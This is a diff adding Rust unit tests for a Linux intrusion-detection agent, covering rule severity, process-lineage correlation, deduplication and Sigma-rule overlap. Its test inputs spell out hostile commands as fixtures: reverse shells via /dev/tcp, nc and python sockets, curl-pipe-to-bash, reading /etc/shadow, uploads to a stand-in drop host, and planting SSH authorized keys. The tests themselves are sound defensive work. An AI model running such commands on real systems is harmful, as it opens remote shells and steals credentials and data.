+        let c = d.correlation.as_ref().unwrap();
+        assert!(c.process_key.as_deref().unwrap().ends_with(":300:1300"));
+        assert!(c.parent_key.as_deref().unwrap().ends_with(":200:1200"));
+        // The login shell below sshd is the session root.
+        assert!(c.root_key.as_deref().unwrap().ends_with(":200:1200"));
+        assert_eq!(c.exe.as_deref(), Some("/usr/bin/cat"));
+        assert_eq!(ev.severity, Severity::Medium, "catalog base, no modifiers");
+        assert_eq!(d.mode, Some(DetectionMode::Alert));
+        assert!(d.dedup_key.as_deref().unwrap().starts_with("creds.shadow_read:"));
+        assert!(d.context_flags.contains(&"ssh_session".to_string()));
+    }
+
+    #[test]
+    fn web_lineage_raises_and_package_manager_lowers() {
+        let e = engine();
+        e.inspect(&exec(10, 1, 33, "nginx", "/usr/sbin/nginx", "nginx: worker"));
+        let out = e.inspect(&exec(11, 10, 33, "sh", "/bin/sh", "sh -c id"));
+        let ev = find(&out, "exec.webserver_shell").expect("web shell fires");
+        assert_eq!(ev.severity, Severity::Critical, "High base + web lineage");
+
+        let e = engine();
+        e.inspect(&exec(20, 1, 0, "apt-get", "/usr/bin/apt-get", "apt-get install x"));
+        e.inspect(&exec(21, 20, 0, "dpkg", "/usr/bin/dpkg", "dpkg --configure"));
+        let out = e.inspect(&exec(22, 21, 0, "sh", "/bin/sh", "sh -c curl -fsSL https://x/install.sh | bash"));
+        let ev = find(&out, "lolbin.download_pipe_shell").expect("still reported");
+        assert_eq!(ev.severity, Severity::Low, "Medium base - package manager lineage");
+    }
+
+    #[test]
+    fn agent_and_its_children_are_never_inspected() {
+        let mut e = engine();
+        e.self_pid = 4242;
+        e.inspect(&exec(4242, 1, 0, "trapd-agent", "/opt/trapd/trapd-agent", "trapd-agent"));
+        let out = e.inspect(&exec(4243, 4242, 0, "sh", "/bin/sh", "sh -c cat /etc/shadow"));
+        assert!(out.is_empty());
+        let out = e.inspect(&exec(4244, 4243, 0, "cat", "/usr/bin/cat", "cat /etc/shadow"));
+        assert!(out.is_empty(), "grandchildren of the agent are its own activity too");
+    }
+
+    #[test]
+    fn proc_poll_duplicate_of_an_ebpf_exec_is_not_inspected() {
+        let e = engine();
+        assert_eq!(
+            e.inspect(&exec(50, 1, 0, "bash", "/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"))
+                .len(),
+            1
+        );
+        let poll = proc_event("bash", "/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1");
+        assert!(e.inspect(&poll).is_empty());
+    }
+
+    #[test]
+    fn closed_flow_records_and_resolver_addresses_are_ignored() {
+        let e = engine();
+        let mut closed = net_event("203.0.113.5", 443);
+        if let EventData::NetworkConnection(n) = &mut closed.data {
+            n.state = "closed".into();
+        }
+        assert!(e.inspect(&closed).is_empty());
+
+        // DnsData only knows the resolver; even a "bad" resolver string must
+        // not be treated as a domain.
+        let dns = AgentEvent::new(
+            "a".into(),
+            "h".into(),
+            EventClass::Network,
+            EventAction::Connection,
+            Severity::Info,
+            EventData::Dns(crate::schema::DnsData {
+                pid: 7,
+                uid: 0,
+                gid: 0,
+                username: "root".into(),
+                comm: "curl".into(),
+                dst_addr: "evil.test".into(),
+                dst_port: 53,
+            }),
+        );
+        assert!(e.inspect(&dns).is_empty());
+    }
+
+    #[test]
+    fn resolved_domain_is_matched() {
+        let e = engine();
+        let res = AgentEvent::new(
+            "a".into(),
+            "h".into(),
+            EventClass::Network,
+            EventAction::Connection,
+            Severity::Info,
+            EventData::DnsResolution(crate::schema::DnsResolutionData {
+                qname: "c2.evil.test".into(),
+                qtype: "A".into(),
+                resolved_ips: vec!["203.0.113.7".into()],
+                cnames: vec![],
+                server_addr: "10.0.0.1".into(),
+                client_addr: "10.0.0.2".into(),
+                transaction_id: 1,
+                rcode: "NOERROR".into(),
+            }),
+        );
+        let out = e.inspect(&res);
+        let ev = find(&out, "ioc.dns_domain").expect("domain IOC fires on the resolved name");
+        assert_eq!(det_of(ev).correlation.as_ref().unwrap().domain.as_deref(), Some("c2.evil.test"));
+    }
+
+    #[test]
+    fn gate_folds_repeats_of_one_command() {
+        let e = engine();
+        let first = e.admit(e.inspect(&exec(60, 1, 0, "cat", "/usr/bin/cat", "cat /etc/shadow")));
+        assert_eq!(first.len(), 1);
+        // Same user, binary and command from a new process: same finding.
+        let again = e.admit(e.inspect(&exec(61, 1, 0, "cat", "/usr/bin/cat", "cat /etc/shadow")));
+        assert!(again.is_empty());
+        let flushed = e.flush_findings(true);
+        assert_eq!(flushed.len(), 1);
+        assert_eq!(det_of(&flushed[0].event).occurrence_count, Some(2));
+    }
+
+    #[test]
+    fn signal_rules_never_alert() {
+        let e = engine();
+        let out = e.inspect(&exec(70, 1, 1000, "x", "/tmp/x", "/tmp/x"));
+        let ev = find(&out, "defense.tmp_exec").unwrap();
+        assert_eq!(det_of(ev).mode, Some(DetectionMode::Signal));
+        assert!(ev.severity <= Severity::Low);
+    }
+
+    #[test]
+    fn session_recon_burst_and_shared_root() {
+        let e = engine();
+        e.inspect(&exec(100, 1, 0, "sshd", "/usr/sbin/sshd", "sshd: u"));
+        e.inspect(&exec(200, 100, 1000, "bash", "/bin/bash", "-bash"));
+        let mut hits = Vec::new();
+        for (pid, c) in [(201, "id"), (202, "whoami"), (203, "uname"), (204, "hostname")] {
+            hits.extend(e.inspect(&exec(pid, 200, 1000, c, &format!("/usr/bin/{c}"), c)));
+        }
+        let burst = find(&hits, "discovery.recon_burst").expect("burst fires");
+        assert_eq!(det_of(burst).mode, Some(DetectionMode::Signal));
+        let up = e.inspect(&exec(205, 200, 1000, "curl", "/usr/bin/curl", "curl -T /tmp/a.tgz https://drop.example.net/"));
+        let ex = find(&up, "exfil.http_upload").unwrap();
+        assert_eq!(
+            det_of(burst).correlation.as_ref().unwrap().root_key,
+            det_of(ex).correlation.as_ref().unwrap().root_key,
+            "one session, one root key"
+        );
+    }
+
+    #[test]
+    fn file_events_replace_command_line_persistence() {
+        let e = engine();
+        let cmd = "bash -c echo key >> /root/.ssh/authorized_keys";
+        assert!(find(&e.inspect(&exec(80, 1, 0, "bash", "/bin/bash", cmd)), "persistence.ssh_authorized_keys").is_some());
+        let open = AgentEvent::new(
+            "a".into(),
+            "h".into(),
+            EventClass::Filesystem,
+            EventAction::Modify,
+            Severity::Info,
+            EventData::FileOpen(crate::schema::FileOpenData {
+                pid: 81,
+                uid: 0,
+                gid: 0,
+                username: "root".into(),
+                comm: "bash".into(),
+                path: "/root/.ssh/authorized_keys".into(),
+                flags: 0o2001,
+            }),
+        );
+        let out = e.inspect(&open);
+        let ev = find(&out, "persistence.ssh_authorized_keys").expect("file rule fires");
+        assert_eq!(
+            det_of(ev).correlation.as_ref().unwrap().file_path.as_deref(),
+            Some("/root/.ssh/authorized_keys")
+        );
+        // From now on the command-line guess for the same rule is dropped.
+        assert!(find(&e.inspect(&exec(82, 1, 0, "bash", "/bin/bash", cmd)), "persistence.ssh_authorized_keys").is_none());
+    }
+
+    #[test]
+    fn collector_detections_are_finalised_and_gated() {
+        let e = engine();
+        e.inspect(&exec(90, 1, 0, "java", "/usr/bin/java", "java -jar app.jar"));
+        let mem = e.detection(
+            Severity::High,
+            DetectionData {
+                rule_id: "memory.anon_exec".into(),
+                title: "t".into(),
+                category: "memory".into(),
+                confidence: 88,
+                subject: "pid 90 (java)".into(),
+                detail: "d".into(),
+                evidence: serde_json::json!({ "pid": 90 }),
+                ..Default::default()
+            },
+        );
+        let out = e.admit_external(mem.clone());
+        assert_eq!(out.len(), 1);
+        let d = det_of(&out[0].event);
+        assert!(d.correlation.as_ref().unwrap().process_key.is_some());
+        assert!(d.evidence.get("process_lineage").is_some());
+        assert!(e.admit_external(mem).is_empty(), "same process, same finding");
+    }
+
+    #[test]
+    fn sanctioned_setuid_binaries_are_quiet() {
+        let e = engine();
+        let ev = |comm: &str| {
+            AgentEvent::new(
+                "a".into(),
+                "h".into(),
+                EventClass::Process,
+                EventAction::Setuid,
+                Severity::Info,
+                EventData::Setuid(SetuidData {
+                    pid: 5,
+                    old_uid: 1000,
+                    new_uid: 0,
+                    comm: comm.into(),
+                }),
+            )
+        };
+        assert!(find(&e.inspect(&ev("sudo")), "privesc.setuid_root").is_none());
+        assert!(find(&e.inspect(&ev("exploit")), "privesc.setuid_root").is_some());
+    }
+
+    #[test]
+    fn brute_force_success_via_logon_events() {
+        let e = engine();
+        let logon = |ok: bool| {
+            AgentEvent::new(
+                "a".into(),
+                "h".into(),
+                EventClass::User,
+                EventAction::Logon,
+                Severity::Info,
+                EventData::UserLogon(crate::schema::UserLogonData {
+                    username: "root".into(),
+                    src_addr: Some("198.51.100.9".into()),
+                    src_port: None,
+                    auth_method: Some("password".into()),
+                    success: ok,
+                }),
+            )
+        };
+        for _ in 0..6 {
+            assert!(e.inspect(&logon(false)).is_empty());
+        }
+        let out = e.inspect(&logon(true));
+        let ev = find(&out, "auth.ssh_bruteforce_success").unwrap();
+        assert_eq!(ev.severity, Severity::High);
+    }
+    /// The shipped example Sigma rules load, and none of them re-detects an
+    /// action a native rule already reports (one action, one finding).
+    #[test]
+    fn sigma_examples_do_not_duplicate_native_rules() {
+        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../deploy/sigma");
+        let sigma = sigma::SigmaEngine::from_dir(&dir);
+        assert!(sigma.len() >= 3, "example rules compile");
+        let e = engine();
+        *e.sigma.write().unwrap() = sigma;
+        let native_cases = [
+            ("bash", "/usr/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
+            ("bash", "/usr/bin/bash", "bash -c curl http://x/i.sh | bash"),
+            ("cat", "/usr/bin/cat", "cat /etc/shadow"),
+            ("python3", "/usr/bin/python3", "python3 -c import socket;s=socket.socket();s.connect(('1.2.3.4',1))"),
+        ];
+        for (i, (comm, exe, cmd)) in native_cases.iter().enumerate() {
+            let out = e.inspect(&exec(500 + i as i32, 1, 0, comm, exe, cmd));
+            let sigma_hits = out.iter().filter(|ev| det_of(ev).category == "sigma").count();
+            assert!(!out.is_empty(), "native rule fires for {cmd}");
+            assert_eq!(sigma_hits, 0, "a sample Sigma rule duplicates the native finding for {cmd}");
+        }
+        // And they still add coverage of their own.
+        let out = e.inspect(&exec(600, 1, 0, "nc", "/usr/bin/nc", "nc 10.0.0.1 4444 -e /bin/sh"));
+        assert_eq!(
+            out.iter().any(|ev| det_of(ev).category == "sigma"),
+            cfg!(target_os = "linux"),
+            "Linux example rules must match only Linux event projections"
+        );
+    }
+
+    /// Detections journaled by an older agent (no correlation / gate fields)
+    /// still deserialise, and new optional fields stay off the wire when empty.
+    #[test]
+    fn detection_payload_is_backward_compatible() {
+        let old = r#"{"event_id":"6f1c3c52-0a35-4f0d-9d5c-0b9d6f8f2b11","agent_id":"a","hostname":"h",
+            "timestamp":"2026-01-01T00:00:00Z","class":"detection","action":"detected","severity":"high",
+            "data":{"rule_id":"revshell.dev_tcp_redirect","title":"t","category":"reverse_shell",
+            "confidence":90,"subject":"/bin/bash","detail":"d","evidence":{"cmdline":"x"}}}"#;
+        let ev: AgentEvent = serde_json::from_str(old).unwrap();
+        let d = det_of(&ev);
+        assert_eq!(d.rule_id, "revshell.dev_tcp_redirect");
+        assert!(d.correlation.is_none() && d.dedup_key.is_none());
+        let json = serde_json::to_value(&ev).unwrap();
+        assert!(json["data"].get("correlation").is_none());
+        assert!(json["data"].get("occurrence_count").is_none());
     }
 }
